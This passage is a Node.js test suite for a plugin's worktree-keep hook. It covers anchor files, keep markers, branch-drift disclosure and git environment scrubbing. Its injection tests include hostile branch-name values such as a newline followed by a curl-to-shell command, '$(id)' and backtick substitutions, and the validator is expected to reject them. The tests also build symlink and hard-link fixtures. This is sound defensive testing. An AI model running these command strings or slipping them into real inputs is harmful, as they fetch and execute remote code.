'use strict';

const test = require('node:test');
const assert = require('node:assert');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { execFileSync } = require('node:child_process');

const ROOT = path.join(__dirname, '..', '..');
const LIB = path.join(ROOT, 'hooks', 'lib');
const MODULE = path.join(LIB, 'worktree-keep-v1.js');
const keep = require(MODULE);
const core = require(path.join(LIB, 'session-control-core-v1.js'));

const KEY_A = 'scv1_' + 'a'.repeat(64);
const KEY_B = 'scv1_' + 'b'.repeat(64);
const NOW = 1_800_000_000_000;
const IDLE = 72 * 3600000;

function git(cwd, args) {
  return execFileSync('git', args, { cwd, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] }).trim();
}

function makeRepo(label) {
  const base = fs.mkdtempSync(path.join(os.tmpdir(), 'wk-' + label + '-'));
  const repo = fs.realpathSync.native(base);
  git(repo, ['init', '-q', '-b', 'main']);
  git(repo, ['config', 'user.email', 'wk@example.invalid']);
  git(repo, ['config', 'user.name', 'wk']);
  git(repo, ['config', 'commit.gpgsign', 'false']);
  fs.writeFileSync(path.join(repo, 'README.md'), 'fixture\n');
  git(repo, ['add', 'README.md']);
  git(repo, ['commit', '-q', '-m', 'init']);
  return repo;
}

function addWorktree(repo, name, branch) {
  const dir = path.join(repo, '.claude', 'worktrees', name);
  fs.mkdirSync(path.dirname(dir), { recursive: true });
  git(repo, ['worktree', 'add', '-q', '-b', branch, dir]);
  return dir;
}

function record(key, root, overrides) {
  return {
    schemaVersion: 1,
    sessionKey: key,
    worktreeRoot: root,
    branch: 'claude/one',
    head: 'abcdef0123456789',
    recordedAt: NOW - 1000,
    lastSeenAt: NOW - 1000,
    drift: null,
    ...(overrides || {}),
  };
}

function runCli(verb, env) {
  const out = execFileSync(process.execPath, [MODULE, verb], {
    cwd: LIB,
    encoding: 'utf8',
    env: { ...process.env, ...env },
  });
  const lines = out.trim().split('\n');
  return JSON.parse(lines[lines.length - 1]);
}

test('the marker constant names the app sentinel and the provenance build matches the operator doc', () => {
  assert.strictEqual(keep.KEEP_FILENAME, '.worktree-keep');
  assert.match(keep.KEEP_SOURCE_BUILD, /^\d+\.\d+\.\d+$/);
  const doc = fs.readFileSync(path.join(ROOT, 'docs', 'worktree-keep.md'), 'utf8');
  assert.ok(doc.includes('Claude Desktop ' + keep.KEEP_SOURCE_BUILD), 'docs/worktree-keep.md must name the build the sentinel was read from');
  assert.ok(doc.includes('`' + keep.KEEP_FILENAME + '`'), 'docs/worktree-keep.md must name the marker file');
});

test('the state layout twin matches the Session Control owner and the scrub list matches the completion gate', () => {
  assert.deepStrictEqual([...keep.STATE_SEGMENTS], [...core.WORKFLOW_STATE_SEGMENTS]);
  const logSh = fs.readFileSync(path.join(LIB, 'zensu-log.sh'), 'utf8');
  const start = logSh.indexOf('_tc_git() {');
  assert.ok(start > 0, 'zensu-log.sh must still define _tc_git');
  const body = logSh.slice(start, logSh.indexOf('git "$@"', start))
    .split('\n').map((l) => l.replace(/#.*$/, '')).join('\n');
  assert.ok(body.trim().length > 0, 'the comment-stripped _tc_git body must not be empty');
  for (const name of keep.GIT_ENV_SCRUB) {
    assert.ok(body.includes(name), name + ' must be one of the variables _tc_git unsets');
  }
  assert.strictEqual((body.match(/GIT_[A-Z_]+/g) || []).length, keep.GIT_ENV_SCRUB.length);
});

test('managedWorktree recognizes a linked worktree under .claude/worktrees and nothing else', () => {
  const repo = makeRepo('managed');
  const wt = addWorktree(repo, 'alpha-1', 'claude/alpha');
  const found = keep.managedWorktree(wt);
  assert.deepStrictEqual(found, { worktreeRoot: wt, baseRepo: repo, name: 'alpha-1' });
  fs.mkdirSync(path.join(wt, 'src', 'deep'), { recursive: true });
  assert.deepStrictEqual(keep.managedWorktree(path.join(wt, 'src', 'deep')), found);
  assert.strictEqual(keep.managedWorktree(repo), null);
  assert.strictEqual(keep.managedWorktree(path.join(repo, 'src')), null);
  assert.strictEqual(keep.managedWorktree(path.join(repo, 'does-not-exist')), null);
  assert.strictEqual(keep.managedWorktree('relative/path'), null);
  assert.strictEqual(keep.managedWorktree(''), null);
});

test('managedWorktree refuses a directory under .claude/worktrees whose .git is not a plain file', () => {
  const repo = makeRepo('managed-nogit');
  const fake = path.join(repo, '.claude', 'worktrees', 'clone');
  fs.mkdirSync(path.join(fake, '.git'), { recursive: true });
  assert.strictEqual(keep.managedWorktree(fake), null);
  const empty = path.join(repo, '.claude', 'worktrees', 'empty');
  fs.mkdirSync(empty, { recursive: true });
  assert.strictEqual(keep.managedWorktree(empty), null);
});

test('anchor write and read round-trip, and the read verdict follows lastSeenAt', () => {
  const repo = makeRepo('anchor');
  const wt = addWorktree(repo, 'beta-1', 'claude/beta');
  const written = keep.writeAnchor(wt, KEY_A, record(KEY_A, wt));
  assert.strictEqual(written.ok, true, JSON.stringify(written));
  assert.strictEqual(written.file, keep.anchorPath(wt, KEY_A));
  const read = keep.readAnchor(wt, KEY_A);
  assert.strictEqual(read.status, 'ok');
  assert.strictEqual(read.record.branch, 'claude/one');
  assert.strictEqual(keep.anchorVerdict(wt, KEY_A, NOW, IDLE).verdict, 'live');
  assert.strictEqual(keep.anchorVerdict(wt, KEY_A, NOW + IDLE + 1, IDLE).verdict, 'stale');
  assert.strictEqual(keep.anchorVerdict(wt, KEY_A, NOW - 5000, IDLE).verdict, 'stale');
  assert.strictEqual(keep.anchorVerdict(wt, KEY_B, NOW, IDLE).verdict, 'missing');
  assert.strictEqual(fs.readdirSync(path.join(wt, '.zensu', 'state')).filter((n) => n.includes('.tmp-')).length, 0);
});

test('writeAnchor refuses a malformed record and a symlink at the target', () => {
  const repo = makeRepo('anchor-refuse');
  const wt = addWorktree(repo, 'gamma-1', 'claude/gamma');
  assert.strictEqual(keep.writeAnchor(wt, KEY_A, { schemaVersion: 2 }).ok, false);
  assert.strictEqual(keep.writeAnchor(wt, KEY_A, record(KEY_B, wt)).ok, false);
  assert.throws(() => keep.anchorPath(wt, 'not-a-key'));
  fs.mkdirSync(path.join(wt, '.zensu', 'state'), { recursive: true });
  const target = keep.anchorPath(wt, KEY_A);
  fs.writeFileSync(path.join(wt, 'elsewhere.json'), '{}');
  fs.symlinkSync(path.join(wt, 'elsewhere.json'), target);
  const refused = keep.writeAnchor(wt, KEY_A, record(KEY_A, wt));
  assert.strictEqual(refused.ok, false);
  assert.strictEqual(refused.reason, 'target-not-a-plain-file');
  assert.strictEqual(keep.readAnchor(wt, KEY_A).status, 'rejected');
});

test('readAnchor rejects the wrong schema, a foreign key, an oversized file and a symlinked state directory', () => {
  const repo = makeRepo('anchor-reject');
  const wt = addWorktree(repo, 'delta-1', 'claude/delta');
  fs.mkdirSync(path.join(wt, '.zensu', 'state'), { recursive: true });
  fs.writeFileSync(keep.anchorPath(wt, KEY_A), JSON.stringify({ schemaVersion: 1, sessionKey: KEY_B }));
  assert.strictEqual(keep.readAnchor(wt, KEY_A).status, 'rejected');
  fs.writeFileSync(keep.anchorPath(wt, KEY_A), JSON.stringify(record(KEY_A, wt)) + ' '.repeat(keep.MAX_ANCHOR_BYTES + 1));
  assert.strictEqual(keep.readAnchor(wt, KEY_A).reason, 'too-large');
  fs.writeFileSync(keep.anchorPath(wt, KEY_A), 'not json');
  assert.strictEqual(keep.readAnchor(wt, KEY_A).reason, 'unparseable');
  const other = addWorktree(repo, 'delta-2', 'claude/delta-2');
  fs.mkdirSync(path.join(other, 'real-state'), { recursive: true });
  fs.mkdirSync(path.join(other, '.zensu'));
  fs.symlinkSync(path.join(other, 'real-state'), path.join(other, '.zensu', 'state'));
  assert.strictEqual(keep.readAnchor(other, KEY_A).status, 'rejected');
  assert.strictEqual(keep.writeAnchor(other, KEY_A, record(KEY_A, other)).ok, false);
});

test('the anchor read and write paths refuse a hard link and a non-regular file at the anchor path', () => {
  const repo = makeRepo('anchor-links');
  const wt = addWorktree(repo, 'delta-3', 'claude/delta-3');
  assert.strictEqual(keep.writeAnchor(wt, KEY_A, record(KEY_A, wt)).ok, true);
  fs.linkSync(keep.anchorPath(wt, KEY_A), path.join(wt, 'twin.json'));
  assert.strictEqual(keep.readAnchor(wt, KEY_A).reason, 'hard-link');
  assert.strictEqual(keep.writeAnchor(wt, KEY_A, record(KEY_A, wt)).reason, 'target-not-a-plain-file');
  assert.strictEqual(keep.removeAnchor(wt, KEY_A).action, 'removed');
  fs.mkdirSync(keep.anchorPath(wt, KEY_B));
  assert.strictEqual(keep.readAnchor(wt, KEY_B).reason, 'not-a-regular-file');
  assert.strictEqual(keep.writeAnchor(wt, KEY_B, record(KEY_B, wt)).reason, 'target-not-a-plain-file');
  assert.strictEqual(keep.removeAnchor(wt, KEY_B).action, 'refused');
});

test('a branch name is held to a ref shape at the read boundary and never reaches a command line unrendered', () => {
  for (const good of ['main', 'claude/wt-one', 'feature/a.b_c-1', 'v1.2.3']) {
    assert.strictEqual(keep.branchNameOk(good), true, good);
  }
  for (const bad of ['x\n; curl evil | sh', 'a;b', 'a b', '$(id)', '`id`', 'a..b', 'a@{1}', 'a.lock', 'trailing/', '/lead', 'a//b', 'a/.hidden', '-flag', '', 42, null]) {
    assert.strictEqual(keep.branchNameOk(bad), false, String(bad));
  }
  const repo = makeRepo('branch-shape');
  const wt = addWorktree(repo, 'rho-1', 'claude/rho');
  fs.mkdirSync(path.join(wt, '.zensu', 'state'), { recursive: true });
  fs.writeFileSync(keep.anchorPath(wt, KEY_A), JSON.stringify(record(KEY_A, wt, { branch: 'x\n; curl evil | sh' })));
  assert.strictEqual(keep.readAnchor(wt, KEY_A).reason, 'shape');
  fs.writeFileSync(keep.anchorPath(wt, KEY_A), JSON.stringify(record(KEY_A, wt, { drift: { from: 'ok', to: 'x`id`', head: null, detectedAt: NOW } })));
  assert.strictEqual(keep.readAnchor(wt, KEY_A).reason, 'shape');
  const healed = keep.run('prompt', { cwd: wt, sessionKey: KEY_A, nowMs: NOW, idleMs: IDLE });
  assert.strictEqual(healed.disclosure, null);
  assert.deepStrictEqual(healed.faults, ['anchor:shape']);
  assert.strictEqual(keep.readAnchor(wt, KEY_A).record.branch, 'claude/rho');
  const lines = keep.remedyLines({ worktreeRoot: wt, from: 'x\n; curl evil | sh' }).join('\n');
  assert.strictEqual(lines.includes('curl'), false);
  assert.strictEqual(lines.includes('git worktree add --detach .claude/worktrees/continue'), true);
  assert.strictEqual(lines.includes('git worktree add .claude/worktrees/'), false);
  assert.strictEqual(lines.includes('not one this plugin renders into a command'), true);
});

test('a checked-out branch outside the ref shape is read as unrenderable, not as a failed read', () => {
  const repo = makeRepo('branch-odd');
  const wt = addWorktree(repo, 'sigma-1', 'claude/sigma');
  git(wt, ['checkout', '-q', '-b', 'odd;name']);
  const current = keep.currentBranch(wt);
  assert.strictEqual(current.ok, true);
  assert.strictEqual(current.branch, keep.UNRENDERABLE_BRANCH);
  assert.strictEqual(current.reason, 'branch-shape');
  assert.strictEqual(keep.branchNameOk(keep.UNRENDERABLE_BRANCH), false);
  assert.strictEqual(keep.branchValueOk(keep.UNRENDERABLE_BRANCH), true);
  assert.match(keep.describeBranch(keep.UNRENDERABLE_BRANCH), /does not render/);
  const started = keep.run('session-start', { cwd: wt, sessionKey: KEY_A, source: 'startup', nowMs: NOW, idleMs: IDLE });
  assert.deepStrictEqual(started.faults, ['branch-unrenderable']);
  assert.strictEqual(started.branch, keep.UNRENDERABLE_BRANCH);
});

test('a takeover onto a branch outside the ref shape is still disclosed, with the name withheld', () => {
  const repo = makeRepo('branch-odd-drift');
  const wt = addWorktree(repo, 'sigma-2', 'claude/sigma2');
  const started = keep.run('session-start', { cwd: wt, sessionKey: KEY_A, source: 'startup', nowMs: NOW, idleMs: IDLE });
  assert.strictEqual(started.branch, 'claude/sigma2');
  git(wt, ['checkout', '-q', '-b', 'odd;name']);
  const taken = keep.run('prompt', { cwd: wt, sessionKey: KEY_A, nowMs: NOW + 1000, idleMs: IDLE });
  assert.ok(taken.drift, 'a takeover onto an unrenderable branch must still produce a drift');
  assert.strictEqual(taken.drift.from, 'claude/sigma2');
  assert.strictEqual(taken.drift.to, keep.UNRENDERABLE_BRANCH);
  assert.ok(taken.disclosure, 'the drift must reach the disclosure');
  assert.match(taken.disclosure, /does not render/);
  assert.ok(!taken.disclosure.includes('odd;name'), 'the unrenderable name must never reach the disclosure');
  const again = keep.run('prompt', { cwd: wt, sessionKey: KEY_A, nowMs: NOW + 2000, idleMs: IDLE });
  assert.strictEqual(again.disclosure, null, 'the same drift is disclosed once');
});

test('reconcileKeep never drops the marker while an anchor could not be validated', () => {
  const repo = makeRepo('rejected-holds');
  const wt = addWorktree(repo, 'tau-1', 'claude/tau');
  keep.run('session-start', { cwd: wt, sessionKey: KEY_A, source: 'startup', nowMs: NOW, idleMs: IDLE });
  assert.strictEqual(keep.markerState(wt).state, 'ours');
  const stateDir = path.join(wt, ...keep.STATE_SEGMENTS);
  fs.writeFileSync(path.join(stateDir, 'worktree-anchor-' + KEY_B + '.json'), '{"schemaVersion":99}');
  fs.unlinkSync(path.join(stateDir, 'worktree-anchor-' + KEY_A + '.json'));
  const kept = keep.reconcileKeep(wt, NOW, IDLE);
  assert.strictEqual(kept.live, 0);
  assert.strictEqual(kept.rejected, 1);
  assert.strictEqual(kept.action, 'kept');
  assert.strictEqual(kept.reason, 'rejected-anchors');
  assert.strictEqual(keep.markerState(wt).state, 'ours');
});

test('listAnchors refuses to read an unbounded number of anchor files, and reconcileKeep then holds the marker', () => {
  const repo = makeRepo('anchor-flood');
  const wt = addWorktree(repo, 'ups-1', 'claude/ups');
  keep.run('session-start', { cwd: wt, sessionKey: KEY_A, source: 'startup', nowMs: NOW, idleMs: IDLE });
  const stateDir = path.join(wt, ...keep.STATE_SEGMENTS);
  for (let i = 0; i <= keep.MAX_ANCHOR_FILES; i += 1) {
    const key = 'scv1_' + i.toString(16).padStart(64, '0');
    fs.writeFileSync(path.join(stateDir, 'worktree-anchor-' + key + '.json'), '{}');
  }
  const flooded = keep.listAnchors(wt, NOW, IDLE);
  assert.strictEqual(flooded.ok, false);
  assert.strictEqual(flooded.reason, 'too-many-anchors');
  assert.deepStrictEqual(flooded.live, []);
  const kept = keep.reconcileKeep(wt, NOW, IDLE);
  assert.strictEqual(kept.action, 'kept');
  assert.strictEqual(kept.anchorsReadable, false);
  assert.strictEqual(keep.markerState(wt).state, 'ours');
});

test('the hook envelope names the event the host keys on, and carries nothing on the other verbs', () => {
  const disclosure = 'zensu worktree-keep: something happened';
  const env = keep.hookEnvelope({ verb: 'prompt', faults: [], disclosure });
  assert.deepStrictEqual(JSON.parse(env.stdout), {
    hookSpecificOutput: { hookEventName: 'UserPromptSubmit', additionalContext: disclosure },
  });
  assert.strictEqual(keep.hookEnvelope({ verb: 'prompt', faults: [], disclosure: null }).stdout, '');
  assert.strictEqual(keep.hookEnvelope({ verb: 'session-start', faults: [], disclosure }).stdout, '');
  assert.strictEqual(keep.hookEnvelope({ verb: 'session-end', faults: [], disclosure }).stdout, '');
  const noisy = keep.hookEnvelope({ verb: 'prompt', faults: ['branch-unrenderable'], disclosure: null });
  assert.deepStrictEqual(noisy.stderr, ['zensu: worktree-keep prompt fault(s): branch-unrenderable']);
});

test('the module bounds it publishes are the bounds it enforces', () => {
  assert.strictEqual(keep.MAX_SWEEP_DIRS, 64);
  assert.strictEqual(keep.MAX_ANCHOR_FILES, 256);
  assert.strictEqual(keep.REAP_FACTOR, 2);
  assert.strictEqual(keep.DEFAULT_IDLE_HOURS, 72);
  assert.strictEqual(keep.idleMsFromHours('1'), 3600000);
  assert.strictEqual(keep.idleMsFromHours(undefined), keep.DEFAULT_IDLE_HOURS * 3600000);
});

test('a supplied sweep bound can never exceed the module maximum', () => {
  const repo = makeRepo('sweep-clamp');
  addWorktree(repo, 'clamp-1', 'claude/clamp1');
  addWorktree(repo, 'clamp-2', 'claude/clamp2');
  const swept = keep.sweepSiblings(repo, NOW, IDLE, { maxDirs: keep.MAX_SWEEP_DIRS + 1000 });
  assert.ok(swept.scanned <= keep.MAX_SWEEP_DIRS, 'the clamp must bound the walk');
  assert.strictEqual(typeof keep.MAX_ANCHOR_FILES, 'number');
});

test('reconcileKeep creates the marker for a live anchor, keeps it, drops it once every anchor is stale and reaps only past twice the window', () => {
  const repo = makeRepo('reconcile');
  const wt = addWorktree(repo, 'eps-1', 'claude/eps');
  assert.strictEqual(keep.reconcileKeep(wt, NOW, IDLE).action, 'absent');
  assert.strictEqual(keep.writeAnchor(wt, KEY_A, record(KEY_A, wt)).ok, true);
  const created = keep.reconcileKeep(wt, NOW, IDLE);
  assert.strictEqual(created.action, 'created');
  assert.strictEqual(created.live, 1);
  const marker = path.join(wt, keep.KEEP_FILENAME);
  assert.strictEqual(fs.readFileSync(marker, 'utf8').split('\n')[0], keep.KEEP_SIGNATURE);
  assert.strictEqual(keep.reconcileKeep(wt, NOW, IDLE).action, 'kept');
  const later = keep.reconcileKeep(wt, NOW + IDLE + 60000, IDLE);
  assert.strictEqual(later.action, 'removed');
  assert.strictEqual(later.stale, 1);
  assert.strictEqual(later.reaped, 0);
  assert.strictEqual(fs.existsSync(marker), false);
  assert.strictEqual(keep.readAnchor(wt, KEY_A).status, 'ok');
  const reaped = keep.reconcileKeep(wt, NOW + keep.REAP_FACTOR * IDLE + 60000, IDLE);
  assert.strictEqual(reaped.reaped, 1);
  assert.strictEqual(keep.readAnchor(wt, KEY_A).status, 'missing');
});

test('reconcileKeep never removes a marker it did not write and refuses a symlinked one', () => {
  const repo = makeRepo('reconcile-foreign');
  const wt = addWorktree(repo, 'zeta-1', 'claude/zeta');
  const marker = path.join(wt, keep.KEEP_FILENAME);
  fs.writeFileSync(marker, 'pinned by hand\n');
  assert.strictEqual(keep.reconcileKeep(wt, NOW, IDLE).action, 'foreign');
  assert.strictEqual(fs.readFileSync(marker, 'utf8'), 'pinned by hand\n');
  assert.strictEqual(keep.writeAnchor(wt, KEY_A, record(KEY_A, wt)).ok, true);
  assert.strictEqual(keep.reconcileKeep(wt, NOW, IDLE).action, 'foreign');
  fs.unlinkSync(marker);
  fs.symlinkSync(path.join(wt, 'README.md'), marker);
  const refused = keep.reconcileKeep(wt, NOW, IDLE);
  assert.strictEqual(refused.action, 'refused');
  assert.strictEqual(fs.lstatSync(marker).isSymbolicLink(), true);
  fs.unlinkSync(marker);
  fs.mkdirSync(marker);
  assert.strictEqual(keep.markerState(wt).reason, 'not-a-plain-file');
});

test('ensureExclude appends the marker line once to the common git dir and leaves .gitignore alone', () => {
  const repo = makeRepo('exclude');
  const first = keep.ensureExclude(repo);
  assert.strictEqual(first.action, 'added');
  const excludeFile = path.join(repo, '.git', 'info', 'exclude');
  assert.strictEqual(first.file, excludeFile);
  assert.strictEqual(keep.ensureExclude(repo).action, 'present');
  const lines = fs.readFileSync(excludeFile, 'utf8').split('\n');
  assert.strictEqual(lines.filter((l) => l === keep.KEEP_FILENAME).length, 1);
  assert.strictEqual(lines.filter((l) => l === keep.EXCLUDE_COMMENT).length, 1);
  assert.strictEqual(fs.existsSync(path.join(repo, '.gitignore')), false);
  const wt = addWorktree(repo, 'eta-1', 'claude/eta');
  fs.writeFileSync(path.join(wt, keep.KEEP_FILENAME), keep.KEEP_BODY);
  assert.strictEqual(git(wt, ['status', '--porcelain', '--untracked-files=all']), '');
});

test('ensureExclude refuses a symlinked exclude file and resolves the common dir from a linked worktree', () => {
  const repo = makeRepo('exclude-refuse');
  fs.mkdirSync(path.join(repo, '.git', 'info'), { recursive: true });
  const excludeFile = path.join(repo, '.git', 'info', 'exclude');
  if (fs.existsSync(excludeFile)) fs.unlinkSync(excludeFile);
  fs.writeFileSync(path.join(repo, 'decoy'), '');
  fs.symlinkSync(path.join(repo, 'decoy'), excludeFile);
  assert.strictEqual(keep.ensureExclude(repo).action, 'refused');
  fs.unlinkSync(excludeFile);
  const wt = addWorktree(repo, 'theta-1', 'claude/theta');
  const viaWorktree = keep.ensureExclude(wt);
  assert.strictEqual(viaWorktree.action, 'added');
  assert.strictEqual(viaWorktree.file, excludeFile);
});

test('git children run with the discovery and config-injection variables scrubbed', () => {
  const env = keep.gitEnvironment({ PATH: '/usr/bin', GIT_DIR: '/elsewhere/.git', GIT_WORK_TREE: '/elsewhere', GIT_CONFIG_COUNT: '1', HOME: '/h' });
  assert.strictEqual(env.GIT_DIR, undefined);
  assert.strictEqual(env.GIT_WORK_TREE, undefined);
  assert.strictEqual(env.GIT_CONFIG_COUNT, undefined);
  assert.strictEqual(env.PATH, '/usr/bin');
  assert.strictEqual(env.HOME, '/h');
  assert.strictEqual(env.GIT_TERMINAL_PROMPT, '0');
  const foreign = makeRepo('git-foreign');
  const repo = makeRepo('git-scrub');
  const wt = addWorktree(repo, 'pi-1', 'claude/pi');
  const started = runCli('session-start', {
    WK_CWD: wt, WK_SESSION_KEY: KEY_A, WK_SOURCE: 'startup', WK_NOW: String(NOW), WK_IDLE_HOURS: '72',
    GIT_DIR: path.join(foreign, '.git'), GIT_WORK_TREE: foreign,
  });
  assert.strictEqual(started.branch, 'claude/pi');
  assert.strictEqual(started.exclude.file, path.join(repo, '.git', 'info', 'exclude'));
  const foreignExclude = path.join(foreign, '.git', 'info', 'exclude');
  const foreignLines = fs.existsSync(foreignExclude) ? fs.readFileSync(foreignExclude, 'utf8').split('\n') : [];
  assert.strictEqual(foreignLines.includes(keep.KEEP_FILENAME), false);
  assert.strictEqual(fs.readFileSync(started.exclude.file, 'utf8').split('\n').includes(keep.KEEP_FILENAME), true);
});

test('sweepSiblings reconciles every sibling, honours the bound and skips what is not a linked worktree', () => {
  const repo = makeRepo('sweep');
  const live = addWorktree(repo, 'a-live', 'claude/a');
  const stale = addWorktree(repo, 'b-stale', 'claude/b');
  const bare = path.join(repo, '.claude', 'worktrees', 'c-not-a-worktree');
  fs.mkdirSync(bare);
  fs.symlinkSync(live, path.join(repo, '.claude', 'worktrees', 'd-link'));
  assert.strictEqual(keep.writeAnchor(live, KEY_A, record(KEY_A, live, { lastSeenAt: NOW - 1000 })).ok, true);
  assert.strictEqual(keep.writeAnchor(stale, KEY_B, record(KEY_B, stale, { lastSeenAt: NOW - IDLE - 1000 })).ok, true);
  fs.writeFileSync(path.join(stale, keep.KEEP_FILENAME), keep.KEEP_BODY);
  const summary = keep.sweepSiblings(repo, NOW, IDLE);
  assert.strictEqual(summary.scanned, 2);
  assert.strictEqual(summary.created, 1);
  assert.strictEqual(summary.removed, 1);
  assert.strictEqual(summary.reaped, 0);
  assert.strictEqual(summary.skipped, 1);
  assert.strictEqual(summary.truncated, false);
  assert.strictEqual(fs.existsSync(path.join(live, keep.KEEP_FILENAME)), true);
  assert.strictEqual(fs.existsSync(path.join(stale, keep.KEEP_FILENAME)), false);
  assert.strictEqual(keep.readAnchor(stale, KEY_B).status, 'ok');
  const bounded = keep.sweepSiblings(repo, NOW, IDLE, { maxDirs: 1 });
  assert.strictEqual(bounded.scanned, 1);
  assert.strictEqual(bounded.truncated, true);
  const skipping = keep.sweepSiblings(repo, NOW, IDLE, { skipRoot: live });
  assert.strictEqual(skipping.scanned, 1);
  assert.strictEqual(keep.sweepSiblings(path.join(repo, 'nowhere'), NOW, IDLE).scanned, 0);
  const reaping = keep.sweepSiblings(repo, NOW + keep.REAP_FACTOR * IDLE + 1000, IDLE);
  assert.strictEqual(reaping.reaped, 2);
  assert.strictEqual(keep.readAnchor(stale, KEY_B).status, 'missing');
});

test('sweepSiblings tolerates a symlinked .zensu inside a sibling without throwing', () => {
  const repo = makeRepo('sweep-symlink');
  const wt = addWorktree(repo, 'iota-1', 'claude/iota');
  fs.mkdirSync(path.join(wt, 'elsewhere'));
  fs.symlinkSync(path.join(wt, 'elsewhere'), path.join(wt, '.zensu'));
  const summary = keep.sweepSiblings(repo, NOW, IDLE);
  assert.strictEqual(summary.scanned, 1);
  assert.strictEqual(fs.existsSync(path.join(wt, keep.KEEP_FILENAME)), false);
  assert.strictEqual(fs.readdirSync(path.join(wt, 'elsewhere')).length, 0);
});

test('currentBranch reports the checked-out branch, a detached head, and failure outside git', () => {
  const repo = makeRepo('branch');
  const wt = addWorktree(repo, 'kappa-1', 'claude/kappa');
  const onBranch = keep.currentBranch(wt);
  assert.strictEqual(onBranch.ok, true);
  assert.strictEqual(onBranch.branch, 'claude/kappa');
  assert.match(onBranch.head, /^[0-9a-f]{40}$/);
  git(wt, ['checkout', '-q', '--detach']);
  const detached = keep.currentBranch(wt);
  assert.strictEqual(detached.ok, true);
  assert.strictEqual(detached.branch, null);
  assert.strictEqual(detached.head, onBranch.head);
  const plain = fs.mkdtempSync(path.join(os.tmpdir(), 'wk-nogit-'));
  assert.strictEqual(keep.currentBranch(plain).ok, false);
});

test('detectDrift answers null on the recorded branch, on an unresolved record, and names the move otherwise', () => {
  const base = record(KEY_A, '/x', { branch: 'claude/one' });
  assert.strictEqual(keep.detectDrift(base, { ok: true, branch: 'claude/one', head: 'abc1234' }), null);
  assert.deepStrictEqual(keep.detectDrift(base, { ok: true, branch: 'claude/two', head: 'abc1234' }), { from: 'claude/one', to: 'claude/two', head: 'abc1234' });
  assert.deepStrictEqual(keep.detectDrift(base, { ok: true, branch: null, head: 'abc1234' }), { from: 'claude/one', to: null, head: 'abc1234' });
  const detachedRecord = record(KEY_A, '/x', { branch: null });
  assert.strictEqual(keep.detectDrift(detachedRecord, { ok: true, branch: null, head: 'def' }), null);
  assert.deepStrictEqual(keep.detectDrift(detachedRecord, { ok: true, branch: 'claude/two', head: null }), { from: null, to: 'claude/two', head: null });
  assert.strictEqual(keep.detectDrift(base, { ok: false, branch: null, head: null }), null);
  const unresolved = record(KEY_A, '/x', { branch: null, head: null });
  assert.strictEqual(keep.unresolvedRecord(unresolved), true);
  assert.strictEqual(keep.unresolvedRecord(detachedRecord), false);
  assert.strictEqual(keep.detectDrift(unresolved, { ok: true, branch: 'claude/two', head: 'abc1234' }), null);
});

test('remedyLines names the nested worktree recipe, the checked-out-elsewhere fallback, the push target and the armed-chain caveat', () => {
  const lines = keep.remedyLines({ worktreeRoot: '/x', from: 'claude/session-trail-worktree-move-c6b69f' });
  const joined = lines.join('\n');
  assert.ok(joined.includes('git worktree add .claude/worktrees/claude-session-trail-worktree-move-c6b69f claude/session-trail-worktree-move-c6b69f'));
  assert.ok(joined.includes('-b claude/session-trail-worktree-move-c6b69f-cont'));
  assert.ok(joined.includes('git push origin HEAD:claude/session-trail-worktree-move-c6b69f'));
  assert.ok(joined.includes('Do not switch this directory back'));
  assert.ok(joined.includes('sibling_worktree'));
  assert.ok(joined.includes('If a Zensu review chain is armed in this session'));
  assert.ok(joined.includes('/zensu:doctor reports this state'));
  assert.strictEqual(keep.branchSlug('claude/x y/z'), 'claude-x-y-z');
  assert.strictEqual(keep.branchSlug(''), 'continue');
  const detached = keep.remedyLines({ worktreeRoot: '/x', from: null }).join('\n');
  assert.ok(detached.includes('git worktree add --detach'));
  assert.strictEqual(keep.describeBranch(null), 'a detached HEAD');
  assert.strictEqual(keep.describeBranch('claude/x'), 'branch claude/x');
});

test('disclosureText and driftSentence carry both branches, the head and the remedy', () => {
  const rec = record(KEY_A, '/w/t', { branch: 'claude/one' });
  const drift = { from: 'claude/one', to: 'claude/two', head: '0123456789abcdef0123' };
  const text = keep.disclosureText(rec, drift);
  assert.ok(text.startsWith('zensu worktree-keep: this session\'s worktree /w/t is now on branch claude/two (HEAD 0123456789ab)'));
  assert.ok(text.includes('recorded branch claude/one'));
  assert.ok(text.includes('another Claude session took over the directory'));
  assert.ok(text.includes('git worktree add .claude/worktrees/claude-two claude/one') === false);
  assert.ok(text.includes('git worktree add .claude/worktrees/claude-one claude/one'));
  assert.ok(text.includes('Tell the user in one sentence'));
  assert.ok(text.includes(keep.driftSentence('/w/t', drift)));
  const detachedText = keep.disclosureText(rec, { from: 'claude/one', to: null, head: null });
  assert.ok(detachedText.includes('is now on a detached HEAD (HEAD unknown)'));
});

test('idleMsFromHours falls back to the default outside 1..8760 and on garbage', () => {
  assert.strictEqual(keep.idleMsFromHours('72'), 72 * 3600000);
  assert.strictEqual(keep.idleMsFromHours('1'), 3600000);
  assert.strictEqual(keep.idleMsFromHours('8760'), 8760 * 3600000);
  assert.strictEqual(keep.idleMsFromHours('0'), keep.DEFAULT_IDLE_HOURS * 3600000);
  assert.strictEqual(keep.idleMsFromHours('8761'), keep.DEFAULT_IDLE_HOURS * 3600000);
  assert.strictEqual(keep.idleMsFromHours('abc'), keep.DEFAULT_IDLE_HOURS * 3600000);
  assert.strictEqual(keep.idleMsFromHours(undefined), keep.DEFAULT_IDLE_HOURS * 3600000);
});

test('cli session-start writes the anchor, the marker and the exclude line, and resume keeps the recorded branch', () => {
  const repo = makeRepo('cli-start');
  const wt = addWorktree(repo, 'lambda-1', 'claude/lambda');
  const first = runCli('session-start', { WK_CWD: wt, WK_SESSION_KEY: KEY_A, WK_SOURCE: 'startup', WK_NOW: String(NOW), WK_IDLE_HOURS: '72' });
  assert.strictEqual(first.managed, true);
  assert.deepStrictEqual(first.faults, []);
  assert.strictEqual(first.anchor.ok, true);
  assert.strictEqual(first.branch, 'claude/lambda');
  assert.strictEqual(first.keep.action, 'created');
  assert.strictEqual(first.exclude.action, 'added');
  assert.strictEqual(fs.existsSync(path.join(wt, keep.KEEP_FILENAME)), true);
  const status = git(wt, ['status', '--porcelain', '--untracked-files=all']);
  assert.strictEqual(status.includes(keep.KEEP_FILENAME), false, status);
  git(wt, ['checkout', '-q', '-b', 'claude/other']);
  const resumed = runCli('session-start', { WK_CWD: wt, WK_SESSION_KEY: KEY_A, WK_SOURCE: 'resume', WK_NOW: String(NOW + 5000), WK_IDLE_HOURS: '72' });
  assert.strictEqual(resumed.branch, 'claude/lambda');
  assert.strictEqual(resumed.keep.action, 'kept');
